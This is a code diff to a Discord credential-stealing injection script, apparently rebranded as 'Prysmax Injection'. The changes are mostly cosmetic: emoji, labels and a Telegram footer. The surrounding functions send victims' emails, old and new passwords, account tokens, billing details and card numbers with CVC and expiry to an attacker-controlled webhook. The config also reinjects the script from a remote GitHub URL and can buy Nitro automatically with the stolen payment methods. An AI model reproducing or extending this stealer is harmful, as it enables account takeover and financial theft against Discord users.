@@ -6,17 +6,17 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
-  auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Prysmax Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://i.imgur.com/atpzrnl.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/Lawxsz/api-test/main/inject.js', //injection url for when it reinjects
+  webhook: '%WEBHOOK%', 
+  webhook_protector_key: '%WEBHOOK_KEY%', 
+  auto_buy_nitro: false, 
+  ping_on_run: true, 
+  ping_val: '@everyone',
+  embed_name: 'Prysmax Injection', 
+  embed_icon: 'https://i.imgur.com/llldOdh.png'.replace(/ /g, '%20'), 
+  embed_color: 2895667, 
+  injection_url: 'https://raw.githubusercontent.com/Lawxsz/api-test/main/inject.js', 
   /**
-   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
+   
    **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -660,17 +660,17 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Info**',
-            value: `Email: **${email}** - Password: **${password}**`,
+            name: '**Account Information**',
+            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: false,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -680,7 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection Success! t.me/lawoficial',
+            text: 'Prysmax Injection・https://t.me/prysmax',
+            icon_url: "https://i.imgur.com/llldOdh.png"
         },
       },
     ],
@@ -703,16 +704,16 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
+            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Old Password: **${oldpassword}**\n<:blacklock:1095741022065131571> New Password: **${newpassword}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -722,7 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection Success! t.me/lawoficial',
+            text: 'Prysmax Injection・https://t.me/prysmax',
+            icon_url: "https://i.imgur.com/llldOdh.png"
         },
       },
     ],
@@ -745,16 +747,16 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -764,7 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection Success! t.me/lawoficial',
+            text: 'Prysmax Injection・https://t.me/prysmax',
+            icon_url: "https://i.imgur.com/llldOdh.png"
         },
       },
     ],
@@ -791,12 +794,12 @@ const PaypalAdded = async (token) => {
             inline: false,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -806,7 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection Success! t.me/lawoficial',
+            text: 'Prysmax Injection・https://t.me/prysmax',
+            icon_url: "https://i.imgur.com/llldOdh.png"
         },
       },
     ],
@@ -833,12 +837,12 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -848,7 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection Success!・https://t.me/lawoficial',
+            text: 'Prysmax Injection・https://t.me/prysmax',
+            icon_url: "https://i.imgur.com/llldOdh.png"
         },
       },
     ],
@@ -877,12 +882,12 @@ const nitroBought = async (token) => {
             inline: true,
           },
           {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: '**Discord Information**',
+            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
             inline: true,
           },
           {
-            name: '**Token**',
+            name: '<:hackerblack:1095747410539593800> **Token**',
             value: `\`${token}\``,
             inline: false,
           },
@@ -892,7 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection Success!・https://t.me/lawoficial',
+            text: 'Prysmax Injection・https://t.me/prysmax',
+            icon_url: "https://i.imgur.com/llldOdh.png"
         },
       },
     ],
